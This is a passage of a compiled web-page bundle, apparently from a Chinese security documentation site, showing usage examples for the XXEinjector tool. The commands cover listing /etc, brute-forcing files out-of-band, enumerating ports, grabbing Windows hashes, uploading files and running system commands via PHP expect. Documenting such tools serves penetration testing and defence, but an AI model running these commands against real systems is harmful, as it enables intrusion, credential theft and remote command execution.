编码，解决传输文件内容时的编码问题")),Object(n.b)("h4",{className:"__internal",id:"使用方法："},Object(n.b)("strong",{parentName:"h4"},"使用方法："),Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"ruby"},Object(n.b)("pre",s({parentName:"div"},{className:"language-ruby"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-ruby"}),Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#列 /etc 目录 通过https:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"path",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"etc ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"ssl\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#二次注入:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"path",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"etc ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"vulnreq",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"2"),"ndfile",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"2"),"ndreq",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt \n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#通过http协议暴力枚举文件:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"brute",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"filenames",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"oob",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"netdoc\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#直接枚举:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"path",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"etc ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"direct",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"UNIQUEMARK")))),Object(n.b)("div",{className:"rcpress-highlight","data-language":"ruby"},Object(n.b)("pre",s({parentName:"div"},{className:"language-ruby"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-ruby"}),Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#枚举所有端口:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"enumports",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"all\n\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#获取windows hash:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"hashes\n\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#通过java的jar上传文件:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"upload",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"uploadfile",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"pdf\n\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#执行系统命令使用 PHP expect:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"oob",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"phpfilter ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"expect",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"ls\n\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#测试XSLT注入:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"host",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".2")," ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"file",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"req",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"xslt\n\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#记录请求日志:"),"\nruby ",Object(n.b)("span",s({parentName:"code"},{className:"token constant"}),"XXEinjector"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"rb ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"logger ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"oob",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"--"),"output",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"tmp",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"out",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"txt"))))}b.isMDXComponent=!0,b=b}}]);